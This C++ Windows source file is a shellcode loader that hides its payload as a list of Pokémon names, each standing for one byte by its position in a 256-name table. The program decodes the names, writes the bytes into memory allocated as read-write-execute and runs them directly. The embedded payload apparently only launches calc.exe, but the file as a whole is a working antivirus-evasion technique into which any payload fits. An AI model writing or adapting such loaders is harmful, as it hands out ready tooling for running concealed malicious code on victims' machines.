#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <iostream>

using namespace std;

int main()
{
	string PokemonList[256] = { "Missingno", "Bulbasaur", "Ivysaur", "Venusaur", "Charmander", "Charmeleon", "Charizard", "Squirtle", "Wartortle", "Blastoise", "Caterpie", "Metapod", "Butterfree", "Weedle", "Kakuna", "Beedrill", "Pidgey", "Pidgeotto", "Pidgeot", "Rattata", "Raticate", "Spearow", "Fearow", "Ekans", "Arbok", "Pikachu", "Raichu", "Sandshrew", "Sandslash", "NidoranF", "Nidorina", "Nidoqueen", "NidoranM", "Nidorino", "Nidoking", "Clefairy", "Clefable", "Vulpix", "Ninetales", "Jigglypuff", "Wigglytuff", "Zubat", "Golbat", "Oddish", "Gloom", "Vileplume", "Paras", "Parasect", "Venonat", "Venomoth", "Diglett", "Dugtrio", "Meowth", "Persian", "Psyduck", "Golduck", "Mankey", "Primeape", "Growlithe", "Arcanine", "Poliwag", "Poliwhirl", "Poliwrath", "Abra", "Kadabra", "Alakazam", "Machop", "Machoke", "Machamp", "Bellsprout", "Weepinbell", "Victreebel", "Tentacool", "Tentacruel", "Geodude", "Graveler", "Golem", "Ponyta", "Rapidash", "Slowpoke", "Slowbro", "Magnemite", "Magneton", "Farfetchd", "Doduo", "Dodrio", "Seel", "Dewgong", "Grimer", "Muk", "Shellder", "Cloyster", "Gastly", "Haunter", "Gengar", "Onix", "Drowzee", "Hypno", "Krabby", "Kingler", "Voltorb", "Electrode", "Exeggcute", "Exeggutor", "Cubone", "Marowak", "Hitmonlee", "Hitmonchan", "Lickitung", "Koffing", "Weezing", "Rhyhorn", "Rhydon", "Chansey", "Tangela", "Kangaskhan", "Horsea", "Seadra", "Goldeen", "Seaking", "Staryu", "Starmie", "Mr. Mime", "Scyther", "Jynx", "Electabuzz", "Magmar", "Pinsir", "Tauros", "Magikarp", "Gyarados", "Lapras", "Ditto", "Eevee", "Vaporeon", "Jolteon", "Flareon", "Porygon", "Omanyte", "Omastar", "Kabuto", "Kabutops", "Aerodactyl", "Snorlax", "Articuno", "Zapdos", "Moltres", "Dratini", "Dragonair", "Dragonite", "Mewtwo", "Mew", "Chikorita", "Bayleef", "Meganium", "Cyndaquil", "Quilava", "Typhlosion", "Totodile", "Croconaw", "Feraligatr", "Sentret", "Furret", "Hoothoot", "Noctowl", "Ledyba", "Ledian", "Spinarak", "Ariados", "Crobat", "Chinchou", "Lanturn", "Pichu", "Cleffa", "Igglybuff", "Togepi", "Togetic", "Natu", "Xatu", "Mareep", "Flaaffy", "Ampharos", "Bellossom", "Marill", "Azumarill", "Sudowoodo", "Politoed", "Hoppip", "Skiploom", "Jumpluff", "Aipom", "Sunkern", "Sunflora", "Yanma", "Wooper", "Quagsire", "Espeon", "Umbreon", "Murkrow", "Slowking", "Misdreavus", "Unown", "Wobbuffet", "Girafarig", "Pineco", "Forretress", "Dunsparce", "Gligar", "Steelix", "Snubbull", "Granbull", "Qwilfish", "Scizor", "Shuckle", "Heracross", "Sneasel", "Teddiursa", "Ursaring", "Slugma", "Magcargo", "Swinub", "Piloswine", "Corsola", "Remoraid", "Octillery", "Delibird", "Mantine", "Skarmory", "Houndour", "Houndoom", "Kingdra", "Phanpy", "Donphan", "Porygon2", "Stantler", "Smeargle", "Tyrogue", "Hitmontop", "Smoochum", "Elekid", "Magby", "Miltank", "Blissey", "Raikou", "Entei", "Suicune", "Larvitar", "Pupitar", "Tyranitar", "Lugia", "Ho-Oh", "Celebi", "Treecko", "Grovyle", "Sceptile", "Torchic" };
	string strshellcode[] = { "Treecko", "Tentacool", "Lapras", "Houndour", "Magby", "Donphan", "Sunflora", "Missingno", "Missingno", "Missingno", "Alakazam", "Magnemite", "Alakazam", "Slowbro", "Magneton", "Magnemite", "Seel", "Tentacool", "Venomoth", "Granbull", "Electrode", "Tentacool", "Omastar", "Magneton", "Drowzee", "Tentacool", "Omastar", "Magneton", "Arbok", "Tentacool", "Omastar", "Magneton", "NidoranM", "Tentacool", "Omastar", "Tangela", "Slowbro", "Tentacool", "Beedrill", "Marill", "Geodude", "Geodude", "Ponyta", "Venomoth", "Unown", "Tentacool", "Venomoth", "Sunflora", "Pichu", "Poliwag", "Hypno", "Jynx", "Ivysaur", "Gloom", "NidoranM", "Alakazam", "Yanma", "Unown", "Weedle", "Alakazam", "Bulbasaur", "Yanma", "Mantine", "Hitmontop", "Magneton", "Alakazam", "Magnemite", "Tentacool", "Omastar", "Magneton", "NidoranM", "Omastar", "Machop", "Poliwag", "Tentacool", "Bulbasaur", "Steelix", "Omastar", "Tauros", "Flareon", "Missingno", "Missingno", "Missingno", "Tentacool", "Eevee", "Sunflora", "Horsea", "Exeggutor", "Tentacool", "Bulbasaur", "Steelix", "Slowbro", "Omastar", "Tentacool", "Arbok", "Machamp", "Omastar", "Kadabra", "NidoranM", "Tentacruel", "Bulbasaur", "Steelix", "Skarmory", "Seel", "Tentacool", "Torchic", "Unown", "Alakazam", "Omastar", "Meowth", "Flareon", "Tentacool", "Bulbasaur", "Heracross", "Ponyta", "Venomoth", "Unown", "Tentacool", "Venomoth", "Sunflora", "Pichu", "Alakazam", "Yanma", "Unown", "Weedle", "Alakazam", "Bulbasaur", "Yanma", "Mankey", "Octillery", "Seadra", "Miltank", "Golem", "Venusaur", "Golem", "Clefable", "Wartortle", "Bellsprout", "Primeape", "Snubbull", "Seadra", "Teddiursa", "Grimer", "Machamp", "Omastar", "Kadabra", "Clefable", "Tentacruel", "Bulbasaur", "Steelix", "Exeggcute", "Alakazam", "Omastar", "Butterfree", "Tentacool", "Machamp", "Omastar", "Kadabra", "Sandslash", "Tentacruel", "Bulbasaur", "Steelix", "Alakazam", "Omastar", "Charmander", "Flareon", "Tentacool", "Bulbasaur", "Steelix", "Alakazam", "Grimer", "Alakazam", "Grimer", "Gengar", "Muk", "Shellder", "Alakazam", "Grimer", "Alakazam", "Muk", "Alakazam", "Shellder", "Tentacool", "Lapras", "Tyrogue", "NidoranM", "Alakazam", "Magneton", "Torchic", "Octillery", "Grimer", "Alakazam", "Muk", "Shellder", "Tentacool", "Omastar", "Pidgeot", "Porygon2", "Dewgong", "Torchic", "Torchic", "Torchic", "Haunter", "Tentacool", "Politoed", "Bulbasaur", "Missingno", "Missingno", "Missingno", "Missingno", "Missingno", "Missingno", "Missingno", "Tentacool", "Kabutops", "Kabutops", "Bulbasaur", "Bulbasaur", "Missingno", "Missingno", "Alakazam", "Politoed", "Venomoth", "Omastar", "Rhyhorn", "Jolteon", "Torchic", "Shuckle", "Hoppip", "Magby", "Ampharos", "Furret", "Seel", "Alakazam", "Politoed", "Ledian", "Dragonite", "Jumpluff", "Typhlosion", "Torchic", "Shuckle", "Tentacool", "Lapras", "Espeon", "Wigglytuff", "Poliwag", "Charizard", "Jynx", "Caterpie", "Tauros", "Celebi", "Octillery", "Seadra", "Charmeleon", "Hoppip", "Victreebel", "Rattata", "Tangela", "Rhyhorn", "Hitmonlee", "Missingno", "Muk", "Alakazam", "Porygon", "Slugma", "Torchic", "Shuckle", "Kingler", "Hypno", "Lickitung", "Kingler", "Paras", "Electrode", "Staryu", "Electrode", "Missingno" };
	int size1 = sizeof(PokemonList) / sizeof(PokemonList[0]);
	int size2 = sizeof(strshellcode) / sizeof(strshellcode[0]);
	string hexshellcode = "";

	DWORD oldprotect = 0;
	int count = 0;
	void* exec = VirtualAlloc(0, size2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	unsigned char *buff = new unsigned char[size2];

	printf("PokemonList size:%d\n",size1);
	printf("strshellcode size:%d\n", size2);


	for (int calc = 0;calc < size2;calc++) { //strshellcode
		for (int calc2=0;calc2 < size1;calc2++) {
			if (strshellcode[calc].compare(PokemonList[calc2])==0) {
				char test = calc2;
				buff[count] = test;
				count++;
			}
		}
	}

	memcpy(exec, buff, count);
	((void(*)())exec)();
	system("pause");
	return 0;
}